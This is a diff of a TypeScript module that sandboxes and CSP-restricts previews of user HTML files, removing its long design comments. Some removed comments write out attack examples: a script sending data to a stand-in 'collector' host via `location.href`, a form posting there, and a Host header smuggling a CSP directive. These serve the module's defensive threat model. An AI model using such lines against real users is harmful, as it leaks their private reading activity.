@@ -1,428 +1,23 @@
-/**
- * The SEAL a served `.html` is drawn behind — what makes showing somebody
- * else's markup safe to do at all, now that the markup is allowed to RUN.
- *
- * A `.md` is text this app renders: it goes through a parser, a sanitiser and a
- * rewrite (`@olai/web`'s `client/markdown/`), and what reaches the DOM is what
- * those three allowed. A `.html` is the opposite shape — it is already the
- * thing a browser runs, and there is no rendering step to be strict in. So the
- * question is not "what do we allow through", it is "what is this markup
- * allowed to do once it is on screen", and that has to be answered before the
- * first byte of it is drawn.
- *
- * THE RULE THAT CHANGED (2026-08-16, the human's ruling). A preview whose own
- * JavaScript is dead is not a preview. The previous seal admitted exactly one
- * script by its hash — ours, the tape measure below — and refused the file's,
- * on purpose, and said so in a sentence marked not negotiable. That sentence is
- * overruled: a saved dashboard, an exported report, a page whose whole content
- * is drawn by its own script are the ordinary contents of somebody's vault, and
- * a preview that shows them blank is showing the wrong thing. PAGE JAVASCRIPT
- * RUNS. What that costs, and what it does not, is the whole subject of this
- * file.
- *
- * WHAT DID NOT MOVE AN INCH is the mechanism that decides the CONSEQUENCE of
- * running: the frame's origin is NOBODY'S. `sandbox` is present and
- * `allow-same-origin` is absent, which is what makes the origin opaque —
- * `document.cookie` is empty, `localStorage` THROWS, `window.parent` is
- * cross-origin and every read of this app's DOM is a `SecurityError`. That was
- * true when nothing could run and it is exactly as true now that everything
- * can, which is the point: the old policy stacked a second bar in front of a
- * door that was already locked, and taking the second bar off did not unlock
- * the door. It is spelled twice, because it is now the only thing standing
- * there — on the element (`@olai/web`'s `client/document/Hypertext.tsx`) and in
- * the POLICY HEADER below, which carries its own `sandbox allow-scripts` so a
- * served page is opaque-origin even when it is not in a frame at all.
- *
- * `allow-scripts` WITH `allow-same-origin` is the combination that must never
- * be written: a document with both can reach into its own frame element and
- * take the sandbox off. One of the two, and it is this one, is a frame that can
- * compute; the pair is a frame that can escape.
- *
- * SO WHAT IS THE SEAL FOR NOW, if not for stopping code. It is for stopping
- * BYTES — where they may come from and where they may go — and that is the one
- * promise this app makes about a page it shows: *a saved page cannot tell
- * anybody else's server what you are reading*. That needs no script to break: a
- * page full of remote images tells a stranger's server what this reader has
- * open the moment it is drawn. So {@link sealPolicy} is a NETWORK policy, and
- * it is read that way top to bottom — every fetching directive names ONE
- * source, the media route on the host the reader asked for, and everything that
- * merely COMPUTES is allowed without argument. `'unsafe-inline'` and
- * `'unsafe-eval'` are in there for exactly that reason: they decide what may
- * run, and what may run is settled by the paragraph above.
- *
- * A HEADER rather than a `<meta>`, and that is what serving the file by URL
- * bought. Two of the directives below cannot be written in markup at all —
- * `sandbox` is ignored in a `<meta>` policy by every browser, and it is the one
- * that makes a top-level visit to `/media/notes/report.html` land in an opaque
- * origin instead of in this app's own. That address is reachable now (it is how
- * the frame gets its bytes), so somebody can type it, and without this header a
- * saved page opened that way would be running in olai's origin with olai's
- * storage under it. The header is not a nicety; it is the reason the route is
- * allowed to exist.
- *
- * WHAT IS STILL PREPENDED, and it is much less than it was: a doctype, a colour
- * scheme, the tape measure and the link handler ({@link SEAL}). No policy — that
- * is a header now. No `<base>` — the document has a real URL to resolve against,
- * which is the whole of point 3 below.
- *
- * RELATIVE ADDRESSES RESOLVE THEMSELVES. This is what a real URL is worth. A
- * `srcdoc` document has no address, so `art/shot.png` in it resolved against
- * nothing at all, and the previous seal had to prepend a `<base href>` at the
- * media route to make a picture draw — which made every relative LINK in the
- * file 404 (`html-preview-relative-links` on the roadmap). Served at
- * `/media/notes/report.html`, the file's own URL is its base: `art/shot.png` is
- * `/media/notes/art/shot.png` and `other.html` is `/media/notes/other.html`,
- * both of them files of this vault. The vault's own shape is the URL space, so
- * nothing has to be rewritten to agree with it.
- *
- * AND THE TWO PART COMPANY AT THE CLICK. The picture is FETCHED, so this route
- * and the policy above govern it. The link is not: `other.html` is a file olai
- * has a PAGE for, so {@link FOLLOW} hands the link out as a message and the app
- * navigates. The frame gains no origin, channel back or privilege — it gets to
- * SAY something over the `postMessage` it already says its height on, and is
- * believed only as far as the app's own lookup.
- *
- * `base-uri 'none'` is what keeps that true. A saved page carries a `<base
- * href>` of its own often enough that it is the ordinary case rather than the
- * attack ("save page as" writes them), and pointed at the site it came from it
- * would move every relative address in the file to a stranger's server. The
- * previous seal won that race by being FIRST in tree order; this one wins it by
- * refusing the element outright, which also covers the `<base>` a script sets
- * after the fact. The file is not edited to make this true — the directive
- * refuses the element, the bytes still carry it.
- *
- * WHAT A PAGE MAY FETCH, then, is one path on one host: `<host>/media/`, the
- * route that answers a picture, a page, a stylesheet, a script or a font under
- * the served directory and a 404 for everything else (`./media.ts` is the
- * guard, `@olai/format`'s `isAsset` is the allowlist, `@olai/server`'s
- * `media.ts` is the route). TWO GUARDS, independent: the policy decides what
- * may be asked for, the route decides what may be answered, and neither is
- * trusted to be the other. The one weakness a path-restricted source has — a
- * redirect drops the path and leaves the origin — is answered by what is at the
- * end of this one: a read of one file under the served directory for a page,
- * and a static file engine with no index and no fallback for everything else.
- * Neither has anywhere to redirect anybody to; both answer a file or a 404.
- *
- * AND `form-action 'none'`, which is here because `default-src` does NOT cover
- * it. Most directives fall back; `form-action` never has — so a
- * `<form action="https://collector/">` in a saved page would be covered only by
- * the SANDBOX (no `allow-forms`, so a submit is blocked), which is a fact about
- * the element rather than about the markup. It is refused twice now, and the
- * policy is self-sufficient. (opencode's review of PR #197 asked for exactly
- * this, and it survives the new rule unchanged.)
- *
- * THE HOLE THIS RULE OPENS, named as plainly as the old costs were, because it
- * is real and it is not closeable here. A script can navigate its own frame:
- * `location.href = "https://collector/?" + whatever it knows`. No CSP directive
- * stops that — `navigate-to` was specified and then removed from the standard,
- * `form-action` covers forms only, and the sandbox's absent
- * `allow-top-navigation` protects the TAB rather than the frame. So a page that
- * WANTS to tell somebody else's server what it is can, once, by leaving. What
- * the seal still buys against that: every passive fetch — image, font,
- * stylesheet, script, `fetch`, frame, form post — stays inside this vault, so a
- * page that merely CARRIES a stranger's addresses (the overwhelming ordinary
- * case, and the one the promise was written about) reaches nobody; and the
- * frame comes home, since `Hypertext.tsx` puts the file back the moment the
- * frame lands on a document that is not one of ours. It is one shot, not a
- * channel. The residue is written into the report of the PR that made this
- * change rather than left for a reader to discover.
- *
- * AND WHY THE FRAME CANNOT SIMPLY BE ASKED WHERE IT IS, which is the second
- * thing the ruling cost. `Hypertext.tsx` tells a document olai served from one
- * it did not by whether the tape measure below reports from it — and a page
- * that has walked off to a server of its own choosing can post that same
- * message. That is not a hole to be plugged: once the previewed file runs
- * script, it is the adversary, and every secret we could give it to prove
- * itself is a secret it can hand to a confederate. The counting over there is
- * therefore a bound on how far a page can drag the frame, not a proof of where
- * the frame is, and it is written as one.
- *
- * WHERE THIS FILE LIVES is the last decision and the one a reader should not
- * have to guess at. The seal used to be the client's, because the client built
- * the markup. It is a WIRE CONTRACT now: the tape measure is prepended by
- * `@olai/server`, its message is read by `@olai/web`, and those two packages
- * cannot import each other — which is the exact sentence this package's own
- * docstring opens with, and why `mediaHref`/`mediaTarget` are next door.
- *
- * That argument covers the MESSAGE half exactly. The policy half ({@link
- * sealPolicy}, {@link spellsHost}) has one consumer, the server, and by the
- * rule above it could live there — it is here anyway, and deliberately: the
- * sandbox argument is ONE argument spanning the header, the frame's attribute
- * and the prefix, and splitting it would leave half a security narrative in
- * each package with nothing saying they are one. It also keeps the fail-closed
- * policy assertable with no browser and no server standing up
- * (`./seal.test.ts`).
- *
- * Pure, and its own module, so the rule can be READ and asserted without a
- * browser: `./seal.test.ts` is what says the policy has not been widened by
- * somebody who needed one embed to work.
- */
-
 
 import { MEDIA_PREFIX } from "./media.ts"
 import { intentOf, localLink, type Intent } from "./press.ts"
 
-/**
- * WHAT THE FRAME SAYS ABOUT ITS HEIGHT, and the whole of it: this prefix, then
- * a number.
- *
- * The two ends of a `postMessage` have to agree on a shape, and the producer
- * here is text inside a script that no compiler reads. So the agreement is
- * THESE CONSTANTS, and both ends are in this module — {@link MEASURE} builds
- * the message out of them and {@link heard} takes it apart. Spelling one
- * twice, once in the script and once in whatever parsed the result, is a rule
- * kept by memory across two files, and its failure mode is the worst kind:
- * nothing throws, no test goes red, the message simply stops being recognised
- * and the preview sits on its fallback height forever.
- *
- * A prefixed STRING rather than an object with named fields, because that is
- * the smallest thing that carries one number across a trust boundary. An object
- * would put its key names in the same two places the tag would have been —
- * spelled in the script's text, spelled again in the parser — and buy nothing:
- * the receiver has to validate every byte either way.
- *
- * ONE of them, and there used to be TWO. A height read while the page is still
- * arriving is a height with holes in it — an `<img>` that has not loaded is a
- * zero-tall box, so the page under it is short by however much the pictures turn
- * out to be — and `load` is the moment there are no holes left. That difference
- * was carried on the wire, as a second prefix, for exactly one receiver: the
- * embedder rationed heights by kind, one of each per width, to keep a page sized
- * in `vh` off its own ladder. It ranks nothing now. The ladder is refused by
- * arithmetic over consecutive readings rather than by counting them
- * (`olai-plugin-hypertext`'s `browser/echo.ts`, where the whole argument is), and a
- * receiver that treats the two alike does not want to be told which it has. So
- * every reading this measure posts — the one taken as the document parses, the
- * ones the observer delivers as it reflows, and the one taken at `load` — is the
- * same message, and `load` earns its listener by being the last moment a page
- * with pictures in it is worth reading rather than by being tagged.
- */
 const READING = "olai:page-height:"
 
-/**
- * HOW FAR TWO WHOLE-PIXEL READINGS OF ONE BOX MAY DISAGREE and still be the
- * same box — and it lives here because this is where the disagreement is
- * MINTED. A browser lays out in fractions; {@link heard} rounds the page's
- * reading UP to a whole pixel (truncated down, the last line of a page is
- * clipped by half of one), and the frame's own height is rounded again,
- * independently, at whatever end asks for it. Two whole numbers describing one
- * unchanged distance may therefore differ by one either way.
- *
- * ONE CONSTANT rather than a `2` in each of the places that needs one, because
- * they are not merely alike — they are ORDERED. `@olai/web`'s
- * `document/echo.ts` may leave a frame this far off its page, so the e2e step
- * that says a frame is "as tall as the page it shows" has to allow at least as
- * much; a copy that drifted below it would go red on a frame doing its job. A
- * number typed twice is a number that eventually disagrees with the app it is
- * asserting about, which is the rule `packages/tests`' `imports.test.ts`
- * states for the whole suite and `@olai/web`'s `chat/near.ts` is the
- * precedent for.
- */
 export const ROUNDING = 2
 
-/**
- * THE HELLO: the first thing every document this server seals says, and the
- * only thing it says that is not a number.
- *
- * It answers a question the embedder cannot ask any other way. A frame's
- * document may change without anybody in this app asking — a page refreshes
- * itself, a reader follows a link — and one of those destinations is a file of
- * this vault, answered by this same route with this same seal over it, while
- * the other is somebody else's server. `Hypertext.tsx` has to tell them apart
- * to know whether to put the file back, and an opaque origin answers no
- * questions about where it is.
- *
- * POSTED AT PARSE TIME, before `DOMContentLoaded` and long before `load`, which
- * is the whole of why it is a message of its own rather than the height
- * reading. The embedder learns about a navigation when the frame's `load` event
- * fires; a hello sent from the first script in the document is queued well
- * before that, so by the time the question is asked the answer is already in.
- * A height cannot do that job — it waits for a layout, and a page with a
- * picture in it waits for the picture.
- *
- * It proves LESS than it looks like it proves, and `Hypertext.tsx` says so at
- * length: a page that has walked off to a server of its own can post these
- * eleven bytes too. It is what a document olai served always says, not
- * something only such a document can say.
- */
 const HELLO = "olai:page-sealed"
 
-/**
- * THE FIFTH THING A SEALED PAGE MAY SAY: the file is in the directory and
- * will not open.
- *
- * It is a MESSAGE rather than a missing document because the embedder already
- * knows the file exists — the heading is on screen, the sidebar has it lit —
- * and an empty 404 frame is the browser saying "there is no such file", which
- * is the wrong sentence. The route that could not read the bytes seals a
- * page of ours instead (`REFUSED_MARKUP`), so the frame greets, and then it
- * says this. `Hypertext.tsx` draws the face in the app's own chrome and
- * hides the frame: the reader is owed the reason on the page, not inside a
- * rectangle that looks like a document.
- *
- * The string is an identity, like {@link HELLO}. A page that has walked off
- * can post it too, and the embedder will then draw the refusal over an
- * empty frame — which is the honest end-state of a file that will not be
- * shown.
- */
 const REFUSED = "olai:page-refused"
 
-/**
- * What both faces say when a body would not open — the `.html` page, and a
- * document refusal line.
- *
- * ONE sentence, because the two producers (`bodies.ts`, `media.ts`) tell one
- * story and the two faces must not invent a second. It does not name the
- * errno: which of the ways a file is unavailable would describe the disk to
- * anybody who can reach the port. The fact is that the file is served and
- * will not open.
- */
 export const BODY_REFUSED = "This file could not be read."
 
-/**
- * The bytes a refused page is, after the seal. The seal still greets and
- * measures, so the frame is a document of this vault rather than a walk-off;
- * this is the body that says why there is nothing to show, and the message
- * that lets the embedder draw the face itself.
- */
 export const REFUSED_MARKUP =
   `<body><p>${BODY_REFUSED}</p>` +
   `<script>parent.postMessage(${JSON.stringify(REFUSED)}, "*")</script></body>`
 
-/** The other end of {@link HELLO} is {@link heard}, with the other two: what a
- *  sealed frame may say is ONE vocabulary, and it is classified once. */
-
-/**
- * THE FOURTH THING A SEALED PAGE MAY SAY (the third is {@link FOLLOW}'s
- * link): where the anchor it was pointed at ended up.
- *
- * It exists because of a gap only the frame can close. A `.html` opened at
- * `#beds` gets the fragment on its own URL, so the browser inside the frame
- * does the scrolling — and that is the whole answer only when the page is
- * TALLER than the box it is drawn in, because then there is somewhere to
- * scroll. The frame is sized to its content (`Hypertext.tsx` clamps the
- * measured height), so the ordinary case is a page that FITS: the browser
- * scrolls nothing, the anchor sits wherever it naturally falls inside the
- * frame, and a reader sent to a section three screens down is looking at the
- * top of the file.
- *
- * The host cannot work out where that is. The origin in there is nobody's, so
- * the element's position is not readable from out here by any means — and the
- * embedder's own scroll is the only thing that can bring it into view. So the
- * frame says where it is, ONCE, after `load`, and only when its own URL named
- * an anchor it actually found.
- *
- * RELATIVE TO THE FRAME'S OWN VIEWPORT (`getBoundingClientRect().top`), which
- * is the reading that is correct in both cases at once: a page that fits
- * reports the anchor's offset inside the box, and a page that scrolled itself
- * reports roughly zero, because the browser has already put it at the top.
- * The embedder adds that to where the frame is and needs to know nothing about
- * which case it is in.
- *
- * SAID AGAIN EVERY TIME THE FRAME CHANGES SIZE, and that is not belt and braces
- * — it is the whole of what makes the number true. The first reading is taken
- * while the frame is still the embedder's `70dvh` guess, so the page overflows
- * a box it is about to stop overflowing: the browser has scrolled the anchor
- * nearly to the top and the answer is a couple of hundred pixels. Then the
- * embedder applies the measured height, the frame grows, the page stops
- * scrolling inside it, and the anchor is suddenly a thousand pixels down.
- * (Measured, not reasoned: reported once at `load`, it said 273 for an anchor
- * that ended up at 1297.)
- *
- * WHAT NOTICES THAT RESIZE IS THE FRAME'S OWN `resize`, and it has to be — the
- * `ResizeObserver` above cannot see it. That observer watches the ROOT BOX,
- * whose `offsetHeight` is the CONTENT's height and deliberately not the frame's
- * (see {@link MEASURE}: reporting the frame's own height back to the frame
- * would pin a short page at whatever it was first given). A page of fixed-height
- * content is therefore exactly as tall before the embedder's resize as after,
- * and the observer never fires. Without the viewport's own event the last thing
- * the embedder hears is whichever of the early readings happened to be last — a
- * race between the frame's `load` and the embedder applying a height, and a
- * reader left a screen above the section whenever it goes the wrong way. The
- * viewport is the box that changed, so the viewport's event is what reports.
- *
- * NOT A HEIGHT, so it is not {@link READING}: it may be zero and it may be
- * negative, and folding it into the height parser would mean widening a gate
- * that exists to refuse exactly those. A number that says "scroll here"
- * is still a CLAIM from an opaque origin — the worst it can do is move this
- * tab's own scrollbar, which the reader undoes with a flick, and the receiver
- * only acts on it while it is waiting for a landing it asked for.
- */
 const LANDED = "olai:page-landed:"
 
-/**
- * The tape measure: the first of the two programs olai puts into somebody
- * else's page ({@link FOLLOW} is the other, and they are as separate as they
- * look — one measures, one listens for a click, and neither knows about the
- * other).
- *
- * It says {@link HELLO} and then reports the page's own height, and does
- * nothing else — no DOM of its own, no state, no reply channel. An iframe does not size to its
- * content, so without it a preview is a fixed slice of the screen: a three-line
- * receipt above two thirds of a screen of white, and a long article inside a
- * scrollbar inside a scrollbar. The only thing that can measure a page is
- * something inside the page, and the only way out of an opaque origin is
- * `postMessage`.
- *
- * It is no longer the ONLY thing running in there, and that changes exactly one
- * thing about it: it is no longer pinned by hash. There is nothing left for a
- * hash to protect — the policy admits `'unsafe-inline'`, because the file's own
- * scripts are now supposed to run — so the constant is a program we prepend
- * rather than a program we can prove is the only one. The receiver was already
- * written for that world: what arrives over `postMessage` is treated as a CLAIM
- * and clamped by CSS at the other end, so the worst a lying height can do is
- * pick one of the two ends of a range the reader would have got anyway.
- *
- * `documentElement.offsetHeight` rather than its `scrollHeight`, and that is
- * the whole trick: in standards mode (which the doctype in {@link SEAL}
- * guarantees) the root box is auto-height, so its `offsetHeight` is the
- * CONTENT's height — while `scrollHeight` is `max(content, viewport)` and would
- * therefore report the frame's current height back to the frame, pinning a
- * short page at whatever it was first given. `body.scrollHeight` is the max'd-in
- * second reading for the page that sets `html { height: 100% }` and overflows
- * it — GUARDED, and the guard is the new rule's doing. It used to rest on
- * "every path into `post` runs at `DOMContentLoaded` or later, and by then
- * there is a body", which was true when nothing in the page could run: a page
- * whose own script does `document.body.remove()` — or replaces the document
- * with `document.write` — has no body afterwards, and an exception thrown in
- * here would land on the console of somebody else's page as ours.
- *
- * TWO mechanisms do the measuring, and ONE function answers for both, since
- * the reading is the same message however it was provoked. A `ResizeObserver`
- * on the root box is the first: it delivers a callback the moment it starts
- * observing, which is the first measurement, and again whenever that box
- * changes — which is how a page reflowing into a narrower window gets a frame
- * that follows it, how a page that DRAWS ITSELF with its own script gets a
- * frame the size of what it drew, and how a page that draws MORE of itself
- * after `load` gets a taller one.
- *
- * `load` is the second, and it is what pictures made necessary: an `<img>` is a
- * box with no height until its bytes arrive, so the page's real height is not
- * knowable until the pictures are in. It reports the SAME message the observer
- * does, and it used to report a differently tagged one — the receiver could not
- * tell "the page grew because its pictures landed" from "the page grew because
- * I made the frame taller and I am measured in `vh`", so it was told. It works
- * the difference out for itself now, from the readings themselves
- * (`olai-plugin-hypertext`'s `browser/echo.ts`).
- *
- * It earns different things in the two branches below, which is why it is
- * registered outside them. Where there is no `ResizeObserver` it is the ONLY
- * second look a page with pictures in it gets. Where there is one, the picture
- * that lands has already changed the root box and been reported — so the height
- * this posts says nothing new and the receiver refuses it as such — and what
- * it is still for is {@link LANDED}: an anchor's position is finally true when
- * there is nothing left to arrive, whether or not anything about the box moved.
- *
- * A THIRD listener measures nothing, and that is why it is not one of the two:
- * `resize` says the FRAME changed size, which moves the anchor without moving
- * anything the observer above is watching, so it re-reports {@link LANDED} and
- * posts no height at all. A height from there would be the `vh` ladder that
- * guard exists to refuse; where the anchor ended up is the one thing that
- * genuinely did change.
- *
- * Guarded rather than assumed, because an exception thrown in here would land
- * on the console of somebody else's page, which is a confusing place to leave
- * one of ours.
- */
 const MEASURE = `(function () {
   parent.postMessage(${JSON.stringify(HELLO)}, "*")
   var tag = ${JSON.stringify(READING)}
@@ -461,21 +56,6 @@ const MEASURE = `(function () {
   }
 })()`
 
-/**
- * The second program olai puts into somebody else's page: it forwards what a
- * reader does at a link to the app instead of letting the frame act on it.
- *
- * A click carries the reader's intent — go, right or new pane — as `./press.ts`'s
- * `intentOf` answers it, INTERPOLATED as source (the frame has no module system,
- * so the one rule is shipped rather than retyped). A context menu, and the
- * pointer moving over and out, are forwarded too, for the app's menu and hover.
- * Links `localLink` (shipped the same way) gives to the page or the browser — an
- * in-page `#fragment`, a download, another target — are left alone, as is
- * anything off this document's origin. A media path is mapped back to the vault
- * path it serves, but only for the `extensions` the vault has pages for. The
- * message is `{ type: "olai:link", … }` with the link's box; the parent
- * (`Hypertext.tsx`) validates it and hands the intent to navigation's `follow`.
- */
 const FOLLOW = (extensions: ReadonlyArray<string>) => `(function () {
   var pages = ${JSON.stringify(extensions)}
   var intentOf = ${intentOf.toString()}
@@ -513,143 +93,27 @@ const FOLLOW = (extensions: ReadonlyArray<string>) => `(function () {
 
 })()`
 
-/**
- * What is put in front of the file's own bytes, and the whole of it.
- *
- * A CONSTANT now, which is the shape of what the header took over: this prefix
- * used to be built per file and per origin because it carried a policy and a
- * base, and it carries neither. Nothing about it depends on which file is being
- * shown or where this app is served.
- *
- * A doctype FIRST, so the frame is in standards mode: the file's own doctype
- * arrives a few characters later and is ignored as a stray token, and a frame
- * that fell into quirks mode would draw somebody's page wrong for a reason they
- * could never find. (It is also what makes the measurement above mean anything
- * — the auto-height root box is a standards-mode fact.)
- *
- * Then a colour scheme, which is not security but is the same kind of decision:
- * a fact about the frame that the file did not ask for and cannot be sensibly
- * left to chance. The preview is LIGHT — an unstyled page is black on white in
- * every browser, and inheriting a dark app's scheme would leave that page's own
- * black text on the frame's own white ground, unreadable, with the file itself
- * blameless. A page that styles itself paints over this and is unaffected.
- *
- * Then the two programs olai puts in there — the tape measure and the link
- * handler — in front of every byte of the file, so both are installed before the
- * file's own markup has been parsed, and beside the file's own scripts now
- * rather than instead of them. ONE `<script>` element holding both, joined by
- * the `;` two adjacent parenthesised expressions need: they are two subjects and
- * one prefix, and a second element would be a second thing for a reader auditing
- * what this app injects to have to find.
- *
- * The MEASURE is first, and one line of it depends on that: the greeting is the
- * earliest thing a sealed document says, and a click handler installed ahead of
- * it would put a statement in front of the sentence every embedder is waiting
- * on.
- *
- * WHAT THIS COSTS, said out loud: the response is no longer the file byte for
- * byte, it is this prefix and then the file byte for byte. Nothing of the
- * file's is parsed, stripped, rewritten or re-encoded — the seal is a PREFIX,
- * which is what lets it be honest about markup it does not understand — but the
- * length changed, so the route serving it cannot answer a byte range and does
- * not offer to (`@olai/server`'s `media.ts`). The charset travels on the
- * response instead of being read out of the file's own `<meta>`, for the same
- * reason: this prefix would push a file's charset declaration past the 1024
- * bytes a parser looks in. Both are named where they are done.
- */
 export const SEAL = (extensions: ReadonlyArray<string>) => `<!doctype html>` +
   `<meta name="color-scheme" content="light">` +
   `<script>${MEASURE};${FOLLOW(extensions)}</script>`
 
-/**
- * The one place a sealed page may fetch from, as a CSP source — or NOTHING,
- * for a host this refuses to spell.
- *
- * Fail-closed, and that is the whole reason this is a function with a test
- * rather than one interpolation. The host arrives from the request's own `Host`
- * header, which is the only thing that can be right: a policy names an origin,
- * and the origin the browser will compare it against is the one the browser
- * asked for. A header is also somebody else's string, and it lands unescaped
- * inside a policy where a `;` would open a directive of their choosing. So it
- * is matched against the shape of a host and nothing else — a name or a
- * bracketed IPv6 literal, an optional port, no path, no credentials, no query.
- *
- * A poisoned `Host` therefore cannot widen anything: it names some other host,
- * the browser resolves the page's own addresses against the host it actually
- * used, and every fetch is refused. Fail-closed by construction rather than by
- * trust.
- *
- * AN ALLOWLIST RATHER THAN A PARSE, and the difference matters enough to write
- * down because the tempting edit is `new URL(...)`. A URL parser is built to
- * accept what browsers accept, and the forbidden-host set it enforces does not
- * include `;` — so `http://a;b` parses, round-trips as its own origin, and
- * would carry a directive of somebody's choosing straight into the policy.
- */
+/** The `Host` header lands unescaped in the policy, where a `;` opens a
+ *  directive of the sender's choosing. Matched against the shape of a host
+ *  rather than parsed: the URL parser's forbidden-host set excludes `;`, so
+ *  `http://a;b` parses and round-trips as its own origin. */
 const HOST = /^(?:[a-z0-9.-]+|\[[0-9a-f:.]+\])(?::\d{1,5})?$/i
 
-/**
- * Whether this module will spell a host into a policy at all — the same
- * question {@link sealPolicy} asks, exported so the SERVER can say out loud
- * that it refused one.
- *
- * A refused host is not an error to fail on: the page is still served, and
- * still sealed, with nothing it may fetch. But it is a page that draws no
- * pictures and runs no scripts of its own for a reason nobody can see from the
- * outside, and "most errors should surface to the user at some level" is this
- * repository's own rule. One rule, one owner, asked twice —
- * rather than the route re-deriving what a host looks like and drifting from
- * the policy it is reporting on.
- */
 export const spellsHost = (host: string): boolean => HOST.test(host)
 
-/**
- * BOTH SCHEMES, on the one host, and it is not a widening: it is the same route
- * named twice because this process cannot see which of the two the browser
- * used. olai listens on plain HTTP; a reader may still reach it through
- * something that terminated TLS, and then the document's own URL is `https:`
- * while every source we could have derived says `http:` — a preview that draws
- * nothing at all, for a reason nobody would find. Naming both is naming the
- * SAME host and the SAME path, never a second place: `https://<this host>` is
- * either this app or somebody who has already taken this app's name.
- */
 const sourcesOn = (host: string): ReadonlyArray<string> =>
   spellsHost(host)
     ? [`http://${host}${MEDIA_PREFIX}`, `https://${host}${MEDIA_PREFIX}`]
     : []
 
-/**
- * The policy a served `.html` is answered with, as the header's value.
- *
- * Read it as two halves, because it is two decisions and only one of them is
- * about the file:
- *
- *   1. `sandbox allow-scripts` — WHOSE ORIGIN this document is in: nobody's,
- *      whether it arrives in olai's frame or in a tab somebody typed the
- *      address into. It intersects with the frame element's own `sandbox`
- *      rather than fighting it (a browser takes the more restrictive of the
- *      two, and the two are the same), so the frame's guarantee does not depend
- *      on which of the two a reader remembers.
- *   2. everything else — WHERE BYTES MAY COME FROM: {@link sourcesOn}, and
- *      nothing else in the world. `default-src` carries it, so a directive
- *      nobody thought of (`connect-src`, `font-src`, `media-src`,
- *      `manifest-src`) falls back to the vault route rather than to open
- *      network. `script-src` and `style-src` re-state it because they add the
- *      keywords that let a page COMPUTE and PAINT — inline scripts, `eval`,
- *      inline styles — which is the ruling this file exists to carry out and
- *      costs nothing on the network side. `frame-src 'none'` is a narrowing of
- *      the same rule: a preview is one frame, and one frame is what
- *      `Hypertext.tsx` counts. `form-action` and `base-uri` are the two
- *      outgoing paths `default-src` does not cover, spelled above.
- *
- * A host this refuses to spell gets the same policy with the vault LEFT OUT of
- * every list — a page that fetches nothing rather than a page that fetches
- * anywhere, which is the failure this direction is supposed to have. Left out
- * rather than replaced by `'none'`, because `'none'` is only a source list when
- * it is the WHOLE of one: a browser ignores it beside any other source, so
- * `script-src 'none' 'unsafe-inline'` is a policy that reads as a refusal and
- * behaves as a permission. An empty list is spelled `'none'` and nothing else
- * is.
- */
+/** `'none'` is a source list only when it is the WHOLE of one: a browser
+ *  ignores it beside any other source, so an empty list is spelled `'none'`
+ *  and nothing else is. `form-action` and `base-uri` do not fall back to
+ *  `default-src`. */
 export const sealPolicy = (host: string): string => {
   const vault = sourcesOn(host)
   const from = (...keywords: ReadonlyArray<string>): string =>
@@ -661,66 +125,13 @@ export const sealPolicy = (host: string): string => {
     `frame-src 'none'; form-action 'none'; base-uri 'none'`
 }
 
-/**
- * EVERYTHING A SEALED FRAME CAN SAY, as one value with three arms.
- *
- * It is one vocabulary on one channel, and it was three exported readers before
- * — a boolean for the greeting, an optional report for a height, an optional
- * path for a click — which the one receiver had to try in an order it was
- * trusted to remember. Three parsers is three chances to be asked in the wrong
- * order, and the rule that the prefixes do not overlap lived nowhere: no type
- * held it, no test asserted the group, and a fourth message would have made a
- * fourth reader and a fourth line at the call site.
- *
- * As arms they cannot be spelled wrong. One function decides once, the decision
- * is carried as a NAME, and the receiver switches on it — which is the same
- * move `@olai/web`'s `Hypertext.tsx` makes with `Custody` a few lines from
- * where it reads this, and for the same reason: a fact about what something IS
- * belongs in the value, not in the order somebody asks about it.
- */
 export type Said =
   | { readonly kind: "link"; readonly href: string; readonly action: "click" | "contextmenu" | "pointerover" | "pointerout"; readonly intent?: Intent; readonly x: number; readonly y: number; readonly width: number; readonly height: number }
-  /** The frame is a document this server sealed — {@link HELLO}. It proves less
-   *  than it looks like it proves, and the receiver says so at length. */
   | { readonly kind: "hello" }
-  /** The file is served and will not open — {@link REFUSED}. */
   | { readonly kind: "refused" }
-  /** How tall the page says it is — {@link READING}. A claim, clamped by CSS at
-   *  the other end. */
   | { readonly kind: "reading"; readonly height: number }
-  /** Where the anchor the frame was pointed at ended up, measured from the
-   *  frame's own top — {@link LANDED}. May be zero, may be negative; the
-   *  embedder adds it to where the frame is. */
   | { readonly kind: "landed"; readonly top: number }
 
-/**
- * What a frame said, as one of {@link Said}'s arms — or nothing, which is the
- * answer to every message that was not one of ours and to every one of ours
- * that made no sense.
- *
- * It lives HERE, beside the scripts whose output it reads, because the two are
- * one thing: a message format. Split across a module boundary it would be a
- * format nobody owns, kept in step by whoever remembers to change both sides.
- * Here it is also PURE and browser-free like everything else in this file, so
- * `./seal.test.ts` can hand it the hostile inputs a real frame never sends.
- *
- * Everything is checked, because the sender is an opaque origin and nothing it
- * says is privileged. Arm by arm:
- *
- *   - the GREETING is an identity, and only the exact string is it;
- *   - a LINK is the one object: a rooted path, a known action and intent, a
- *     finite box. The path is still only a claim — the receiver looks it up;
- *   - a READING carries a number. `Number` of a prefix-stripped tail rejects
- *     the empty string as `0` and anything wordy as `NaN`, both of which fall
- *     out through the same gate as a negative or an infinity. Rounded UP,
- *     because a fractional layout truncated down is the last line of a page
- *     clipped by half a pixel.
- *
- * The arms are tried in the order they are cheapest to refuse, and that order
- * is not load-bearing: `./seal.test.ts` asserts that no one of the three
- * prefixes begins another, which is what makes the classification a fact about
- * the message rather than about this function's arm order.
- */
 export const heard = (said: unknown): Said | undefined => {
   if (typeof said === "object" && said !== null) {
     const message = said as Record<string, unknown>
@@ -738,15 +149,6 @@ export const heard = (said: unknown): Said | undefined => {
   if (said === REFUSED) return { kind: "refused" }
   if (typeof said !== "string") return undefined
   if (said.startsWith(LANDED)) {
-    // FINITE is the gate, and it is a wider one than a height's on purpose:
-    // this number is an offset rather than a size, so zero is the ordinary
-    // answer for a page the browser scrolled to its own anchor, and a negative
-    // one is what a page scrolled past it honestly reports.
-    //
-    // Which is exactly why the EMPTY tail has to be refused here and does not
-    // over there: `Number("")` is `0`, and a height parser gets that for free
-    // by demanding a positive number while an offset parser would read a
-    // message carrying no number at all as a perfectly good landing at the top.
     const tail = said.slice(LANDED.length)
     const top = Number(tail)
     return tail.trim() !== "" && Number.isFinite(top)
